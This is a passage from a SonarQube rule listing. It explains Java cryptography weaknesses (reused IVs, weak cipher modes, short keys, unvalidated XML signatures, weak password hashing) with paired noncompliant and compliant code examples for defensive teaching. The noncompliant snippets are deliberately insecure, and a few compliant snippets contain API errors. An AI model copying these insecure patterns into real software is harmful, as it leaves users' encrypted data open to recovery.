  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/759">CWE-759 - Use of a One-Way Hash without a Salt</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/760">CWE-760 - Use of a One-Way Hash with a Predictable Salt</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S3329">
              java:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a "starting variable" (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.nio.charset.StandardCharsets;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidKeyException;
import java.security.InvalidAlgorithmParameterException;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.NoSuchPaddingException;

public void encrypt(String key, String plainText) {

    byte[] RandomBytes = "7cVgr5cbdCZVw5WY".getBytes(StandardCharsets.UTF_8);

    GCMParameterSpec iv   = new GCMParameterSpec(128, RandomBytes);
    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");

    try {
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv); // Noncompliant

    } catch(NoSuchAlgorithmException|InvalidKeyException|
            NoSuchPaddingException|InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code explicitly uses a number generator that is considered <strong>strong</strong>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidKeyException;
import java.security.InvalidAlgorithmParameterException;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.NoSuchPaddingException;

public void encrypt(String key, String plainText) {

    SecureRandom random = new SecureRandom();
    byte[] randomBytes  = new byte[16];
    random.nextBytes(randomBytes);

    GCMParameterSpec iv   = new GCMParameterSpec(128, randomBytes);
    SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(StandardCharsets.UTF_8), "AES");

    try {
        Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, keySpec, iv);

    } catch(NoSuchAlgorithmException|InvalidKeyException|
            NoSuchPaddingException|InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Use unique IVs</h4>
<p>To ensure high security, initialization vectors must meet two important criteria:</p>
<ul>
  <li> IVs must be unique for each encryption operation. </li>
  <li> For CBC and CFB modes, a secure FIPS-compliant random number generator should be used to generate unpredictable IVs. </li>
</ul>
<p>The IV does not need be secret, so the IV or information sufficient to determine the IV may be transmitted along with the ciphertext.</p>
<p>In the previous non-compliant example, the problem is not that the IV is hard-coded.<br> It is that the same IV is used for multiple encryption
attempts.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/329">CWE-329 - Not Using an Unpredictable IV with CBC Mode</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/780">CWE-780 - Use of RSA Algorithm without OAEP</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf">NIST, SP-800-38A</a> - Recommendation for Block Cipher
  Modes of Operation </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5542">
              java:S5542
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<p>For AES, the weakest mode is ECB (Electronic Codebook). Repeated blocks of data are encrypted to the same value, making them easy to identify and
reducing the difficulty of recovering the original cleartext.</p>
<p>Unauthenticated modes such as CBC (Cipher Block Chaining) may be used but are prone to attacks that manipulate the ciphertext. They must be used
with caution.</p>
<p>For RSA, the weakest algorithms are either using it without padding or using the PKCS1v1.5 padding scheme.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate possible impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Example with a symmetric cipher, AES:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance("AES/CBC/PKCS5Padding"); // Noncompliant
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<p>Example with an asymmetric cipher, RSA:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance("RSA/None/NoPadding"); // Noncompliant
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<p>For the AES symmetric cipher, use the GCM mode:</p>
<pre data-diff-id="1" data-diff-type="compliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance("AES/GCM/NoPadding");
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<p>For the RSA asymmetric cipher, use the Optimal Asymmetric Encryption Padding (OAEP):</p>
<pre data-diff-id="2" data-diff-type="compliant">
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public static void main(String[] args) {
    try {
        Cipher.getInstance("RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING");
    } catch(NoSuchAlgorithmException|NoSuchPaddingException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptographic community.</p>
<p>Appropriate choices are currently the following.</p>
<h4>For AES: use authenticated encryption modes</h4>
<p>The best-known authenticated encryption mode for AES is Galois/Counter mode (GCM).</p>
<p>GCM mode combines encryption with authentication and integrity checks using a cryptographic hash function and provides both confidentiality and
authenticity of data.</p>
<p>Other similar modes are:</p>
<ul>
  <li> CCM: <code>Counter with CBC-MAC</code> </li>
  <li> CWC: <code>Cipher Block Chaining with Message Authentication Code</code> </li>
  <li> EAX: <code>Encrypt-and-Authenticate</code> </li>
  <li> IAPM: <code>Integer Authenticated Parallelizable Mode</code> </li>
  <li> OCB: <code>Offset Codebook Mode</code> </li>
</ul>
<p>It is also possible to use AES-CBC with HMAC for integrity checks. However, it is considered more straightforward to use AES-GCM directly
instead.</p>
<h4>For RSA: use the OAEP scheme</h4>
<p>The Optimal Asymmetric Encryption Padding scheme (OAEP) adds randomness and a secure hash function that strengthens the regular inner workings of
RSA.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4426">
              java:S4426
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In today’s cryptography, the length of the <strong>key</strong> directly affects the security level of cryptographic algorithms.</p>
<p>Note that depending on the algorithm, the term <strong>key</strong> refers to a different mathematical property. For example:</p>
<ul>
  <li> For RSA, the key is the product of two large prime numbers, also called the <strong>modulus</strong>. </li>
  <li> For AES and Elliptic Curve Cryptography (ECC), the key is only a sequence of randomly generated bytes.
    <ul>
      <li> In some cases, AES keys are derived from a master key or a passphrase using a Key Derivation Function (KDF) like PBKDF2 (Password-Based Key
      Derivation Function 2) </li>
    </ul>  </li>
</ul>
<p>If an application uses a key that is considered short and <strong>insecure</strong>, the encrypted data is exposed to attacks aimed at getting at
the plaintext.</p>
<p>In general, it is best practice to expect a breach: that a user or organization with malicious intent will perform cryptographic attacks on this
data after obtaining it by other means.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, the company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in Java Cryptography Extension</h2>
<h3>Code examples</h3>
<p>The following code examples either explicitly or implicitly generate keys. Note that there are differences in the size of the keys depending on the
algorithm.</p>
<p>Due to the mathematical properties of the algorithms, the security requirements for the key size vary depending on the algorithm.<br> For example,
a 256-bit ECC key provides about the same level of security as a 3072-bit RSA key and a 128-bit symmetric key.</p>
<h4>Noncompliant code example</h4>
<p>Here is an example of a private key generation with RSA:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(1024); // Noncompliant

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<p>Here is an example of a private key generation with AES:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
import java.security.KeyGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyGenerator keyGenerator = KeyGenerator.getInstance("AES");
        keyGenerator.initialize(64); // Noncompliant

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<p>Here is an example of an Elliptic Curve (EC) initialization. It implicitly generates a private key whose size is indicated in the elliptic curve
name:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator    = KeyPairGenerator.getInstance("EC");
        ECGenParameterSpec ellipticCurveName = new ECGenParameterSpec("secp112r1"); // Noncompliant
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(2048);

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("AES");
        keyPairGenerator.initialize(128);

    } catch (NoSuchAlgorithmException e) {
        // ...
    }
}
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.InvalidAlgorithmParameterException;
import java.security.spec.ECGenParameterSpec;

public static void main(String[] args) {
    try {
        KeyPairGenerator keyPairGenerator    = KeyPairGenerator.getInstance("EC");
        ECGenParameterSpec ellipticCurveName = new ECGenParameterSpec("secp256r1");
        keyPairGenerator.initialize(ellipticCurveName);

    } catch (NoSuchAlgorithmException | InvalidAlgorithmParameterException e) {
        // ...
    }
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, use the cryptographic algorithms and mechanisms that are considered strong by the cryptography community.</p>
<p>The appropriate choices are the following.</p>
<h4>RSA (Rivest-Shamir-Adleman) and DSA (Digital Signature Algorithm)</h4>
<p>The security of these algorithms depends on the difficulty of attacks attempting to solve their underlying mathematical problem.</p>
<p>In general, a minimum key size of <strong>2048</strong> bits is recommended for both. It provides 112 bits of security. A key length of
<strong>3072</strong> or <strong>4092</strong> should be preferred when possible.</p>
<h4>AES (Advanced Encryption Standard)</h4>
<p>AES supports three key sizes: 128 bits, 192 bits and 256 bits. The security of the AES algorithm is based on the computational complexity of trying
all possible keys.<br> A larger key size increases the number of possible keys and makes exhaustive search attacks computationally infeasible.
Therefore, a 256-bit key provides a higher level of security than a 128-bit or 192-bit key.</p>
<p>Currently, a minimum key size of <strong>128 bits</strong> is recommended for AES.</p>
<h4>Elliptic Curve Cryptography (ECC)</h4>
<p>Elliptic curve cryptography is also used in various algorithms, such as ECDSA, ECDH, or ECMQV. The length of keys generated with elliptic curve
algorithms is mentioned directly in their names. For example, <code>secp256k1</code> generates a 256-bits long private key.</p>
<p>Currently, a minimum key size of <strong>224 bits</strong> is recommended for EC-based algorithms.</p>
<p>Additionally, some curves that theoretically provide sufficiently long keys are still discouraged. This can be because of a flaw in the curve
parameters, a bad overall design, or poor performance. It is generally advised to use a NIST-approved elliptic curve wherever possible. Such curves
currently include:</p>
<ul>
  <li> NIST P curves with a size of at least 224 bits, e.g. secp256r1. </li>
  <li> Curve25519, generally known as ed25519 or x25519 depending on its application. </li>
  <li> Curve448. </li>
  <li> Brainpool curves with a size of at least 224 bits, e.g. brainpoolP224r1 </li>
</ul>
<h3>Going the extra mile</h3>
<h4>Pre-Quantum Cryptography</h4>
<p>Encrypted data and communications recorded today could be decrypted in the future by an attack from a quantum computer.<br> It is important to keep
in mind that NIST-approved digital signature schemes, key agreement, and key transport may need to be replaced with secure quantum-resistant (or
"post-quantum") counterpart.</p>
<p>Thus, if data is to remain secure beyond 2030, proactive measures should be taken now to ensure its safety.</p>
<p><a href="https://www.enisa.europa.eu/publications/post-quantum-cryptography-current-state-and-quantum-mitigation">Learn more here</a>.</p>
<h2>Resources</h2>
<ul>
  <li> Documentation
    <ul>
      <li> NIST Documentation - <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-186.pdf">NIST SP 800-186: Recommendations
      for Discrete Logarithm-based Cryptography: Elliptic Curve Domain Parameters</a> </li>
      <li> IETF - <a href="https://datatracker.ietf.org/doc/html/rfc5639">rfc5639: Elliptic Curve Cryptography (ECC) Brainpool Standard Curves and
      Curve Generation</a> </li>
    </ul>  </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/dotnet/standard/security/vulnerabilities-cbc-mode">Microsoft, Timing vulnerabilities with CBC-mode
  symmetric decryption using padding</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Padding_oracle_attack">Wikipedia, Padding Oracle Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-ciphertext_attack">Wikipedia, Chosen-Ciphertext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Chosen-plaintext_attack">Wikipedia, Chosen-Plaintext Attack</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Semantic_security">Wikipedia, Semantically Secure Cryptosystems</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Wikipedia, OAEP</a> </li>
  <li> <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode">Wikipedia, Galois/Counter Mode</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/326">CWE-326 - Inadequate Encryption Strength</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/327">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6377">
              java:S6377
            </a>
          </td>
          <td>
            <details>
              <p>XML signatures are a method used to ensure the integrity and authenticity of XML documents. However, if XML signatures are not validated securely,
it can lead to potential vulnerabilities.</p>
<h2>Why is this an issue?</h2>
<p>Before Java 17, XML Digital Signature API does not apply restrictions on XML signature validation unless the application runs with a security
manager, which is rare.</p>
<h2>What is the potential impact</h2>
<p>By not enforcing secure validation, the XML Digital Signature API is more susceptible to attacks such as signature spoofing and injections.</p>
<h3>Increased Vulnerability to Signature Spoofing</h3>
<p>By disabling secure validation, the application becomes more susceptible to signature spoofing attacks. Attackers can potentially manipulate the
XML signature in a way that bypasses the validation process, allowing them to forge or tamper with the signature. This can lead to the acceptance of
invalid or maliciously modified signatures, compromising the integrity and authenticity of the XML documents.</p>
<h3>Risk of Injection Attacks</h3>
<p>Disabling secure validation can expose the application to injection attacks. Attackers can inject malicious code or entities into the XML document,
taking advantage of the weakened validation process. In some cases, it can also expose the application to denial-of-service attacks. Attackers can
exploit vulnerabilities in the validation process to cause excessive resource consumption or system crashes, leading to service unavailability or
disruption.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>For versions of Java before 17, secure validation is disabled by default unless the application runs with a security manager, which is rare. It
should be enabled explicitly by setting the <code>org.jcp.xml.dsig.secureValidation</code> attribute to true with the
<code>javax.xml.crypto.dsig.dom.DOMValidateContext.setProperty</code> method.</p>
<p>For Java 17 and higher, secure validation is enabled by default.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
NodeList signatureElement = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");

XMLSignatureFactory fac = XMLSignatureFactory.getInstance("DOM");
DOMValidateContext valContext = new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0)); // Noncompliant
XMLSignature signature = fac.unmarshalXMLSignature(valContext);

boolean signatureValidity = signature.validate(valContext);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
NodeList signatureElement = doc.getElementsByTagNameNS(XMLSignature.XMLNS, "Signature");

XMLSignatureFactory fac = XMLSignatureFactory.getInstance("DOM");
DOMValidateContext valContext = new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0));
valContext.setProperty("org.jcp.xml.dsig.secureValidation", Boolean.TRUE);
XMLSignature signature = fac.unmarshalXMLSignature(valContext);

boolean signatureValidity = signature.validate(valContext);
</pre>
<h3>How does this work?</h3>
<p>When XML Signature secure validation mode is enabled, XML Signatures are processed more securely. It enforces a number of restrictionsto to protect
from XML Documents that may contain hostile constructs that can cause denial-of-service or other types of security issues.</p>
<p>These restrictions can protect you from XML Signatures that may contain potentially hostile constructs that can cause denial-of-service or other
types of security issues.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Oracle Java Documentation - <a
  href="https://docs.oracle.com/en/java/javase/21/security/java-xml-digital-signature-api-overview-and-tutorial.html">XML Digital Signature API
  Overview and Tutorial</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10:2021 A02:2021 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/347">CWE-347 - Improper Verification of Cryptographic Signature</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5344">
              java:S5344
            </a>
          </td>
          <td>
            <details>
              <p>The improper storage of passwords poses a significant security risk to software applications. This vulnerability arises when passwords are stored
in plaintext or with a fast hashing algorithm. To exploit this vulnerability, an attacker typically requires access to the stored passwords.</p>
<h2>Why is this an issue?</h2>
<p>Attackers who would get access to the stored passwords could reuse them without further attacks or with little additional effort.<br> Obtaining the
plaintext passwords, they could then gain unauthorized access to user accounts, potentially leading to various malicious activities.</p>
<h3>What is the potential impact?</h3>
<p>Plaintext or weakly hashed password storage poses a significant security risk to software applications.</p>
<h4>Unauthorized Access</h4>
<p>When passwords are stored in plaintext or with weak hashing algorithms, an attacker who gains access to the password database can easily retrieve
and use the passwords to gain unauthorized access to user accounts. This can lead to various malicious activities, such as unauthorized data access,
identity theft, or even financial fraud.</p>
<h4>Credential Reuse</h4>
<p>Many users tend to reuse passwords across multiple platforms. If an attacker obtains plaintext or weakly hashed passwords, they can potentially use
these credentials to gain unauthorized access to other accounts held by the same user. This can have far-reaching consequences, as sensitive personal
information or critical systems may be compromised.</p>
<h4>Regulatory Compliance</h4>
<p>Many industries and jurisdictions have specific regulations and standards to protect user data and ensure its confidentiality. Storing passwords in
plaintext or with weak hashing algorithms can lead to non-compliance with these regulations, potentially resulting in legal consequences, financial
penalties, and damage to the reputation of the software application and its developers.</p>
<h2>How to fix it in Spring</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>The following code is vulnerable because it uses a legacy digest-based password encoding that is not considered secure.</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
@Autowired
